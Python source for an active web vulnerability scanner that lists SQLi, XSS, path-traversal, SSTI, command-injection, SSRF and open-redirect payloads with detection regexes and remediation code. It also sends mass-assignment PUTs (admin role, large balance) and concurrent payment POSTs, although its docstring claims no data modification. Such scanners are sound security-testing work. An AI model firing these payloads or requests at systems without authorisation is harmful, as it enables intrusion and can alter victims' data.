"""
ABSA Active Scanner — Phase A Rewrite
Accepts an optional shared ThrottledClient. When provided, all active
test requests flow through the shared stealth pipeline.
Real OWASP Top 10 payloads with real detection patterns.
Non-destructive: SQLi uses benign SELECT, XSS uses markers, no data modification.
"""

import asyncio
import re
from typing import List, Optional, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.models import Endpoint, Finding, Severity, FindingType, Payload, ComplianceMapping, ScanContext
from utils.http_client import ThrottledClient
from utils.helpers import calculate_cvss, score_to_severity, is_destructive_payload, make_url_with_param
from utils.logger import get_logger
import config

logger = get_logger("scanner.active")

SQLI_PAYLOADS = [
    "' OR 1=1--", "' OR '1'='1", "1' OR '1'='1'--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "1; SELECT 1--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' AND SLEEP(3)--", "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "admin'--", "' OR 1=1 LIMIT 1 OFFSET 0--",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "1' WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1'||(SELECT 'x' FROM dual)||'",
]

XSS_PAYLOADS = [
    '<absa-xss>alert("ABSA_XSS")</absa-xss>',
    '"><img src=x onerror=alert("ABSA_XSS")>',
    "'-alert('ABSA_XSS')-'",
    '<svg onload=alert("ABSA_XSS")>',
    'javascript:alert("ABSA_XSS")',
    "{{7*7}}", "${7*7}", "<%=7*7%>",
    '<details open ontoggle=alert("ABSA_XSS")>',
    '<a href="javascript:alert(1)">click</a>',
    "' onfocus=alert(1) autofocus='",
]

OPEN_REDIRECT_PAYLOADS = [
    "/%09/google.com", "//google.com", "https://google.com%00@target",
    "/\\google.com", "///google.com", "//evil.com%2F%2Ftarget",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/proc/self/environ", "/proc/self/cmdline",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
]

SSTI_PAYLOADS = [
    "{{config}}", "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime)}", "#{applicationScope}",
    "{{<%= 'test' %>}}", "{{request.application.__globals__}}",
]

CMDI_PAYLOADS = [
    "; id", "| id", "`id`", "$(id)", "; whoami",
    "| whoami", "&& whoami", "\nwhoami",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0", "http://metadata.google.internal",
    "http://100.100.100.200/latest/meta-data/",
]

SQLI_PATTERNS = [
    r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?", r"PostgreSQL.*?ERROR",
    r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server",
    r"(\W|\A)ORA\-[0-9]+", r"Oracle.*?Driver", r"Unclosed quotation mark",
    r"quoted string not properly terminated", r"SQL command not properly ended",
    r"com\.microsoft\.sqlserver\.jdbc", r"ODBC SQL Server Driver",
    r"Warning.*?\Wpg_", r"valid MySQL result", r"MySqlClient\.",
]
XSS_PATTERNS = [r"ABSA_XSS", r"<absa-xss>", r"onerror", r"ontoggle"]
LFI_PATTERNS = [r"root:.*?:0:0:", r"\[boot loader\]", r"\[fonts\]", r"\[extensions\]", r"proc/self"]
SSTI_PATTERNS = [r"<Config", r"<Module", r"<class", r"subclasses", r"jinja2"]
SSRF_PATTERNS = [r"127\.0\.0\.1", r"localhost", r"169\.254\.169\.254", r"meta-data", r"ami-id", r"instance-id"]
CMDI_PATTERNS = [r"uid=\d+", r"gid=\d+", r"groups=", r"root:x:0:0"]

CSRF_TOKENS = ["csrf", "csrf_token", "csrfmiddlewaretoken", "__requestverificationtoken",
               "authenticity_token", "x-csrf-token", "x-xsrf-token", "antiforgerytoken"]
REDIRECT_PARAMS = ["url", "redirect", "return", "returnTo", "next", "goto",
                   "dest", "destination", "redir", "continue", "target", "forward"]


class ActiveScanner:
    def __init__(self, context: ScanContext, client: ThrottledClient = None):
        self.ctx = context
        self._client = client
        self._owns_client = client is None
        if self._owns_client:
            self._client = ThrottledClient(
                concurrency=context.concurrency,
                delay=context.delay,
                timeout=context.timeout,
            )
        self.findings: List[Finding] = []

    async def scan(self, endpoints: List[Endpoint]) -> List[Finding]:
        logger.info("Active scan against %d endpoints", len(endpoints))
        testable = [e for e in endpoints if e.parameters or e.forms]
        pages = [e for e in endpoints if e.discovery_source in ("crawl", "js_parse")]
        logins = [e for e in endpoints if e.is_login]
        apis = [e for e in endpoints if e.is_api]
        logger.info("  Testable: %d | Pages: %d | Logins: %d | APIs: %d",
                     len(testable), len(pages), len(logins), len(apis))

        await self._sqli(testable)
        await self._xss(testable)
        await self._csrf(logins)
        await self._open_redirect(pages)
        await self._lfi(testable)
        await self._ssti(testable)
        await self._cmdi(testable)
        await self._ssrf(testable)
        await self._api(apis)
        await self._auth(logins)
        await self._race_condition(pages)

        if self._owns_client:
            await self._client.close()
        logger.info("Active scan done: %d findings", len(self.findings))
        return self.findings

    async def _inject(self, ep, param, payloads, patterns, vuln_type, loc="query"):
        baseline = 0.0
        for p in payloads:
            if is_destructive_payload(p):
                continue
            if loc == "query":
                url = make_url_with_param(ep.url, param, p)
                r = await self._client.get(url)
            elif loc == "body":
                r = await self._client.post(ep.url, data={param: p})
            elif loc == "header":
                r = await self._client.get(ep.url, headers={param: p})
            else:
                continue
            if r["error"]:
                continue
            body, status, rt = r["body"], r["status"], r["time_ms"]
            matched = any(re.search(pt, body, re.I) for pt in patterns)
            time_anom = False
            if vuln_type == "sqli" and any(kw in p.upper() for kw in ("SLEEP", "BENCHMARK", "WAITFOR")):
                if baseline == 0:
                    br = await self._client.get(ep.url)
                    baseline = br["time_ms"]
                if baseline > 0 and rt > baseline * 3 and rt > 3000:
                    time_anom = True
            if matched or time_anom:
                ev = f"Status: {status}\n"
                if matched:
                    ev += "Pattern matched in response body\n"
                if time_anom:
                    ev += f"Time anomaly: {rt:.0f}ms (baseline: {baseline:.0f}ms)\n"
                ev += f"Payload: {p}\nParam: {param}\nLocation: {loc}"
                return Payload(payload_string=p, payload_type=vuln_type, parameter=param,
                               location=loc, response_code=status, response_time_ms=rt,
                               evidence=ev, success=True)
        return None

    def _finding(self, **kw):
        base = kw.pop("cvss_base", 5.0)
        wt = kw.pop("weakness_type", "default")
        adj = calculate_cvss(base, wt)
        sev = kw.pop("severity", score_to_severity(adj))
        comp = kw.pop("compliance", [ComplianceMapping(
            framework="PCI DSS 4.0", clause_id="6.2.4",
            clause_title="Protect Web Applications",
            description="Web apps must be tested for vulnerabilities via code review or automated scanning."
        )])
        return Finding(severity=sev, cvss_score=adj, compliance_mappings=comp, **kw)

    async def _sqli(self, eps):
        logger.info("  [SQLi] Testing %d endpoints...", len(eps))
        for ep in eps:
            for param in ep.parameters:
                r = await self._inject(ep, param, SQLI_PAYLOADS, SQLI_PATTERNS, "sqli", "query")
                if r:
                    self.findings.append(self._finding(
                        title=f"SQL Injection in '{param}' at {ep.url}",
                        description=f"SQL injection in parameter '{param}'. Server returned database error patterns or timing anomalies.",
                        severity=Severity.CRITICAL, finding_type=FindingType.OWASP, cwe_id="CWE-89",
                        affected_url=ep.url, affected_parameter=param, payloads=[r], evidence=r.evidence,
                        cvss_base=9.8, weakness_type="data_exposure", phase="active",
                        reproduction_steps=[
                            f"1. Navigate to {ep.url}",
                            f"2. Insert into '{param}': {r.payload_string}",
                            f"3. Observe SQL error/timing in response",
                        ],
                        remediation="Use parameterized queries (prepared statements) for ALL database operations. Never concatenate user input into SQL strings.",
                        remediation_code="# VULNERABLE (Python):\nquery = f\"SELECT * FROM accounts WHERE id = '{user_input}'\"\ncursor.execute(query)\n\n# FIXED:\nquery = \"SELECT * FROM accounts WHERE id = %s\"\ncursor.execute(query, (user_input,))\n\n# VULNERABLE (Java):\nString q = \"SELECT * FROM users WHERE id = '\" + id + \"'\";\n\n# FIXED:\nPreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\nps.setString(1, id);",
                    ))
                    logger.warning("    [FOUND] SQLi: %s?%s", ep.url, param)
            for form in ep.forms:
                for inp in form["inputs"]:
                    if not inp["name"] or inp["type"] in ("submit", "button"):
                        continue
                    r = await self._inject(ep, inp["name"], SQLI_PAYLOADS, SQLI_PATTERNS, "sqli", "body")
                    if r:
                        self.findings.append(self._finding(
                            title=f"SQL Injection in form field '{inp['name']}'",
                            description=f"SQL injection via POST parameter '{inp['name']}' in form at {ep.url}.",
                            severity=Severity.CRITICAL, finding_type=FindingType.OWASP, cwe_id="CWE-89",
                            affected_url=ep.url, affected_parameter=inp["name"], payloads=[r], evidence=r.evidence,
                            cvss_base=9.8, weakness_type="data_exposure", phase="active",
                            remediation="Use parameterized queries for all database operations.",
                            remediation_code="cursor.execute(\"SELECT * FROM users WHERE id = %s\", (input_value,))",
                        ))

    async def _xss(self, eps):
        logger.info("  [XSS] Testing %d endpoints...", len(eps))
        for ep in eps:
            for param in ep.parameters:
                r = await self._inject(ep, param, XSS_PAYLOADS, XSS_PATTERNS, "xss", "query")
                if r:
                    self.findings.append(self._finding(
                        title=f"Reflected XSS in '{param}'",
                        description=f"Reflected XSS: user input in '{param}' is rendered without encoding at {ep.url}.",
                        severity=Severity.HIGH, finding_type=FindingType.OWASP, cwe_id="CWE-79",
                        affected_url=ep.url, affected_parameter=param, payloads=[r], evidence=r.evidence,
                        cvss_base=7.5, phase="active",
                        remediation="Encode all user-supplied data before HTML rendering. Use context-appropriate encoding. Set Content-Security-Policy.",
                        remediation_code="# Jinja2 (auto-escape):\n{{ user_input|e }}\n\n# JavaScript (safe):\nelement.textContent = userInput;\n// NOT: element.innerHTML = userInput;\n\n# CSP Header:\nContent-Security-Policy: default-src 'self'; script-src 'self'",
                    ))
            for form in ep.forms:
                for inp in form["inputs"]:
                    if not inp["name"] or inp["type"] in ("submit", "button", "hidden"):
                        continue
                    r = await self._inject(ep, inp["name"], XSS_PAYLOADS, XSS_PATTERNS, "xss", "body")
                    if r:
                        self.findings.append(self._finding(
                            title=f"Reflected XSS via POST '{inp['name']}'",
                            description=f"XSS in form field '{inp['name']}' via POST body at {ep.url}.",
                            severity=Severity.HIGH, finding_type=FindingType.OWASP, cwe_id="CWE-79",
                            affected_url=ep.url, affected_parameter=inp["name"], payloads=[r], evidence=r.evidence,
                            cvss_base=7.5, phase="active",
                            remediation="Encode output. Implement CSP.",
                        ))

    async def _csrf(self, logins):
        logger.info("  [CSRF] Checking %d forms...", len(logins))
        for ep in logins:
            for form in ep.forms:
                fh = form.get("raw_html", str(form))
                has_csrf = any(t in fh.lower() for t in CSRF_TOKENS)
                if not has_csrf:
                    self.findings.append(self._finding(
                        title=f"Missing CSRF Token on Login Form at {ep.url}",
                        description=f"Login form at {ep.url} (action: {form['action']}) has no CSRF protection.",
                        severity=Severity.MEDIUM, finding_type=FindingType.OWASP, cwe_id="CWE-352",
                        affected_url=ep.url, cvss_base=5.4, weakness_type="authentication_bypass", phase="active",
                        remediation="Implement anti-CSRF tokens on all state-changing forms. Use SameSite=Lax cookie attribute.",
                        remediation_code="# Flask:\nfrom flask_wtf.csrf import CSRFProtect\ncsrf = CSRFProtect(app)\n\n# Template:\n<form method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\">\n  ...\n</form>",
                    ))

    async def _open_redirect(self, eps):
        logger.info("  [REDIRECT] Testing %d pages...", min(len(eps), 50))
        for ep in eps[:50]:
            for param in REDIRECT_PARAMS:
                for payload in OPEN_REDIRECT_PAYLOADS[:3]:
                    url = make_url_with_param(ep.url, param, payload)
                    r = await self._client.get(url, allow_redirects=False)
                    if r["status"] in (301, 302, 303, 307, 308):
                        loc = r["headers"].get("location", "")
                        if "google.com" in loc or "///" in loc or "evil.com" in loc:
                            self.findings.append(self._finding(
                                title=f"Open Redirect via '{param}'",
                                description=f"Parameter '{param}' at {ep.url} redirects to: {loc}",
                                severity=Severity.MEDIUM, finding_type=FindingType.OWASP, cwe_id="CWE-601",
                                affected_url=ep.url, affected_parameter=param,
                                evidence=f"Status: {r['status']} Location: {loc}",
                                cvss_base=5.4, phase="active",
                                remediation="Validate redirect URLs against an allowlist. Use relative paths.",
                            ))
                            break

    async def _lfi(self, eps):
        logger.info("  [LFI] Testing %d endpoints...", len(eps))
        for ep in eps:
            for param in ep.parameters:
                r = await self._inject(ep, param, PATH_TRAVERSAL_PAYLOADS, LFI_PATTERNS, "lfi", "query")
                if r:
                    self.findings.append(self._finding(
                        title=f"Path Traversal in '{param}'",
                        description=f"Local File Inclusion via '{param}' at {ep.url}.",
                        severity=Severity.HIGH, finding_type=FindingType.OWASP, cwe_id="CWE-22",
                        affected_url=ep.url, affected_parameter=param, payloads=[r], evidence=r.evidence,
                        cvss_base=7.5, weakness_type="data_exposure", phase="active",
                        remediation="Validate and sanitize file paths. Use allowlists. Never pass user input to filesystem operations.",
                        remediation_code="import os\n\nALLOWED = {'reports/jan.pdf', 'reports/feb.pdf'}\n\ndef safe_read(filename):\n    normalized = os.path.normpath(filename)\n    if normalized not in ALLOWED:\n        raise ValueError('Invalid file')\n    with open(normalized) as f:\n        return f.read()",
                    ))

    async def _ssti(self, eps):
        logger.info("  [SSTI] Testing %d endpoints...", len(eps))
        for ep in eps:
            for param in ep.parameters:
                r = await self._inject(ep, param, SSTI_PAYLOADS, SSTI_PATTERNS, "ssti", "query")
                if r:
                    self.findings.append(self._finding(
                        title=f"Server-Side Template Injection in '{param}'",
                        description=f"SSTI: template engine evaluated injected expression in '{param}'.",
                        severity=Severity.CRITICAL, finding_type=FindingType.OWASP, cwe_id="CWE-1336",
                        affected_url=ep.url, affected_parameter=param, payloads=[r], evidence=r.evidence,
                        cvss_base=9.8, weakness_type="authentication_bypass", phase="active",
                        remediation="Never interpolate user input into templates. Pass as context variables. Use auto-escaping.",
                        remediation_code="# VULNERABLE:\nrender_template_string(f\"Hello {{ {user_input} }}\")\n\n# FIXED:\nrender_template('page.html', name=safe_escape(user_input))\n\n# Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()",
                    ))

    async def _cmdi(self, eps):
        logger.info("  [CMDi] Testing %d endpoints...", len(eps))
        for ep in eps:
            for param in ep.parameters:
                r = await self._inject(ep, param, CMDI_PAYLOADS, CMDI_PATTERNS, "cmdi", "query")
                if r:
                    self.findings.append(self._finding(
                        title=f"OS Command Injection in '{param}'",
                        description=f"Command injection: server executed OS commands via '{param}'.",
                        severity=Severity.CRITICAL, finding_type=FindingType.OWASP, cwe_id="CWE-78",
                        affected_url=ep.url, affected_parameter=param, payloads=[r], evidence=r.evidence,
                        cvss_base=9.8, weakness_type="authentication_bypass", phase="active",
                        remediation="Never pass user input to OS command functions. Use language-native libraries. If unavoidable, use allowlists and shlex.quote().",
                        remediation_code="# VULNERABLE:\nos.system(f\"ping {user_input}\")\n\n# FIXED:\nimport subprocess\nsubprocess.run(['ping', user_input], check=True)\n\n# With allowlist:\nALLOWED_HOSTS = {'10.0.0.1', '10.0.0.2'}\nif user_input in ALLOWED_HOSTS:\n    subprocess.run(['ping', user_input])",
                    ))

    async def _ssrf(self, eps):
        logger.info("  [SSRF] Testing %d endpoints...", len(eps))
        for ep in eps:
            for param in ep.parameters:
                r = await self._inject(ep, param, SSRF_PAYLOADS, SSRF_PATTERNS, "ssrf", "query")
                if r:
                    self.findings.append(self._finding(
                        title=f"SSRF via '{param}'",
                        description=f"Server-Side Request Forgery: server made requests to internal resources.",
                        severity=Severity.HIGH, finding_type=FindingType.OWASP, cwe_id="CWE-918",
                        affected_url=ep.url, affected_parameter=param, payloads=[r], evidence=r.evidence,
                        cvss_base=7.5, weakness_type="data_exposure", phase="active",
                        remediation="Validate URLs server-side. Allowlist domains. Block private IPs, link-local, cloud metadata.",
                        remediation_code="import ipaddress, urllib.parse\n\nBLOCKED = [\n    ipaddress.ip_network('10.0.0.0/8'),\n    ipaddress.ip_network('172.16.0.0/12'),\n    ipaddress.ip_network('192.168.0.0/16'),\n    ipaddress.ip_network('169.254.0.0/16'),\n    ipaddress.ip_network('127.0.0.0/8'),\n]\n\ndef is_safe_url(url):\n    p = urllib.parse.urlparse(url)\n    try:\n        ip = ipaddress.ip_address(p.hostname)\n        return not any(ip in net for net in BLOCKED)\n    except ValueError:\n        return p.hostname in ALLOWED_DOMAINS",
                    ))

    async def _api(self, apis):
        logger.info("  [API] Checking %d API endpoints...", len(apis))
        for ep in apis:
            if "graphql" in ep.url.lower():
                iq = '{"query":"{ __schema { types { name } } }"}'
                r = await self._client.post(ep.url, data=iq, headers={"Content-Type": "application/json"})
                if r["status"] == 200 and "__schema" in r["body"]:
                    self.findings.append(self._finding(
                        title="GraphQL Introspection Enabled",
                        description=f"GraphQL at {ep.url} exposes full schema via introspection.",
                        severity=Severity.LOW, finding_type=FindingType.API_SECURITY, cwe_id="CWE-200",
                        affected_url=ep.url, cvss_base=3.5, phase="active",
                        remediation="Disable introspection in production. Apollo: introspection: false.",
                    ))
            r = await self._client.options(ep.url)
            if r["status"] == 200:
                allow = r["headers"].get("allow", "")
                if "PUT" in allow or "PATCH" in allow:
                    test_body = '{"role":"admin","isAdmin":true,"accountType":"premium","balance":999999}'
                    r2 = await self._client.put(ep.url, data=test_body, headers={"Content-Type": "application/json"})
                    if r2["status"] in (200, 201, 204) and not r2["error"]:
                        if any(f in r2["body"].lower() for f in ["admin", "premium", "role", "999999"]):
                            self.findings.append(self._finding(
                                title=f"Mass Assignment at {ep.url}",
                                description=f"PUT/PATCH accepts unauthorized fields (role, isAdmin, balance).",
                                severity=Severity.HIGH, finding_type=FindingType.API_SECURITY, cwe_id="CWE-915",
                                affected_url=ep.url, cvss_base=7.5, weakness_type="authentication_bypass", phase="active",
                                remediation="Use explicit field allowlists in DTOs. Never bind request bodies to DB models.",
                                remediation_code="# VULNERABLE:\nuser = User(**request.json)\n\n# FIXED:\nclass UserUpdateDTO(BaseModel):\n    name: str\n    email: str\n    # 'role', 'isAdmin', 'balance' NOT included\n\ndto = UserUpdateDTO(**request.json)\nuser.name = dto.name\nuser.email = dto.email",
                            ))

    async def _auth(self, logins):
        logger.info("  [AUTH] Checking %d login forms...", len(logins))
        for ep in logins:
            for form in ep.forms:
                fh = form.get("raw_html", str(form))
                if 'autocomplete="off"' not in fh.lower() and 'autocomplete="new-password"' not in fh.lower():
                    self.findings.append(self._finding(
                        title="Password Field Allows Autocomplete",
                        description=f"Password field at {ep.url} does not disable autocomplete.",
                        severity=Severity.LOW, finding_type=FindingType.AUTH_BYPASS, cwe_id="CWE-525",
                        affected_url=ep.url, cvss_base=3.1, phase="active",
                        remediation='Add autocomplete="new-password" to password inputs.',
                        remediation_code='<input type="password" name="password" autocomplete="new-password" required>',
                    ))
            if self.ctx.target_scheme == "http":
                self.findings.append(self._finding(
                    title="Login Over Unencrypted HTTP",
                    description=f"Login at {ep.url} over HTTP — credentials in cleartext.",
                    severity=Severity.CRITICAL, finding_type=FindingType.AUTH_BYPASS, cwe_id="CWE-319",
                    affected_url=ep.url, cvss_base=9.1, weakness_type="financial_impact", phase="active",
                    remediation="Serve entire application over HTTPS. Enable HSTS. Redirect HTTP to HTTPS.",
                    remediation_code="# Nginx:\nserver {\n    listen 80;\n    return 301 https://$host$request_uri;\n}\nserver {\n    listen 443 ssl;\n    add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains' always;\n    ssl_certificate /path/to/cert.pem;\n    ssl_certificate_key /path/to/key.pem;\n}",
                ))

    async def _race_condition(self, pages):
        logger.info("  [RACE] Testing for race conditions...")
        transfer_eps = [e for e in pages if any(kw in e.url.lower() for kw in
                        ("transfer", "payment", "withdraw", "debit", "send", "pay"))]
        if not transfer_eps:
            logger.info("    No transfer endpoints found for race testing")
            return
        for ep in transfer_eps[:3]:
            try:
                tasks = [self._client.post(
                    ep.url,
                    data={"amount": "1.00", "to": "self"},
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                ) for _ in range(5)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count = sum(1 for r in results if isinstance(r, dict) and r["status"] in (200, 201) and not r["error"])
                if success_count > 1:
                    self.findings.append(self._finding(
                        title=f"Race Condition on {ep.url}",
                        description=f"5 concurrent requests — {success_count} succeeded. Missing concurrency controls.",
                        severity=Severity.CRITICAL, finding_type=FindingType.BUSINESS_LOGIC, cwe_id="CWE-362",
                        affected_url=ep.url, cvss_base=9.1, weakness_type="financial_impact", phase="active",
                        remediation="Implement idempotency keys. Use SELECT FOR UPDATE. Apply per-user rate limiting.",
                        remediation_code="import uuid\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    idempotency_key = request.headers.get('Idempotency-Key')\n    if not idempotency_key:\n        return error('Missing Idempotency-Key header'), 400\n    if db.exists('processed_transactions', idempotency_key):\n        return db.get('processed_transactions', idempotency_key)\n    with db.transaction():\n        account = db.query('SELECT balance FROM accounts WHERE id = %s FOR UPDATE', [from_id])\n        if account.balance < amount:\n            return error('Insufficient funds')\n        db.execute('UPDATE accounts SET balance = balance - %s WHERE id = %s', [amount, from_id])\n        db.execute('UPDATE accounts SET balance = balance + %s WHERE id = %s', [amount, to_id])\n        result = success_response()\n        db.set('processed_transactions', idempotency_key, result, ttl=86400)\n        return result",
                    ))
                    logger.warning("    [FOUND] Race condition: %d/5 on %s", success_count, ep.url)
            except Exception as e:
                logger.debug("    Race test error on %s: %s", ep.url, e)